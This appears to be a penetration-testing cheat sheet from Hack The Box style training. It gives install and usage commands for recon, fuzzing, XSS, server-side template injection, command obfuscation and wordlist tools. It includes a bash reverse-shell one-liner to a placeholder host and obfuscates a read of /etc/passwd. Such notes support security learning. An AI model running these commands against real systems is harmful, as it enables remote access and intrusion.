# Web Sites
- [PayloadsAllTheTHings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md)
- [xss-payload-list](https://github.com/payloadbox/xss-payload-list)

# ReconSpider
Recon all the web page
- Download
```bash
pip3 install scrapy
wget -O ReconSpider.zip https://academy.hackthebox.com/storage/modules/144/ReconSpider.v1.2.zip
unzip ReconSpider.zip
```
- Example
```bash
python3 ReconSpider.py http://inlanefreight.com
``` 

# Fuzzing the API
Reconaisse all paths in the system
- Download
```bash
git clone https://github.com/PandaSt0rm/webfuzz_api.git
cd webfuzz_api
pip3 install -r requirements.txt
```
- Example
```bash
python3 api_fuzzer.py http://IP:PORT
``` 
# xsstrike
Explotating xss attack
- Download
```bash
git clone https://github.com/s0md3v/XSStrike.git
cd XSStrike
pip install -r requirements.txt
```
- Example
```bash
python3 xsstrike.py -u "http://SERVER_IP:PORT/index.php?task=test" 
``` 
# Reverse shell
```bash
bash -c 'bash -i >& /dev/tcp/TU_IP/PUERTO 0>&1 2>&1'
``` 
# Deofuscation
## Linux
- Download
```bash
git clone https://github.com/Bashfuscator/Bashfuscator
cd Bashfuscator
pip3 install setuptools==65
python3 setup.py install --user
```
- Example
```bash
cd ./bashfuscator/bin/
./bashfuscator -c 'cat /etc/passwd'
```
## Windows
- Download
```bash
git clone https://github.com/danielbohannon/Invoke-DOSfuscation.git
cd Invoke-DOSfuscation
Import-Module .\Invoke-DOSfuscation.psd1
```
- Example
```bash
Invoke-DOSfuscation
SET COMMAND type C:\Users\htb-student\Desktop\flag.txt
encoding
1
```
## Gopherus protocol
[Gopherus](https://github.com/tarunkant/Gopherus)

## SSTI tool
- Download
```bash
git clone https://github.com/vladko312/SSTImap
cd SSTImap
pip3 install -r requirements.txt
```
- Example
```bash
python3 sstimap.py -u http://172.17.0.2/index.php?name=test
```
## Username Anarchy
Create own dictionary
- Download
```bash
git clone https://github.com/urbanadventurer/username-anarchy.git
cd username-anarchy
```
- Example
```bash
./username-anarchy Jane Smith > jane_smith_usernames.txt
```
## CUPP
Create a more personal dictionary
- Download
```bash
sudo apt install cupp -y
```
- Example
```bash
cupp -i
```
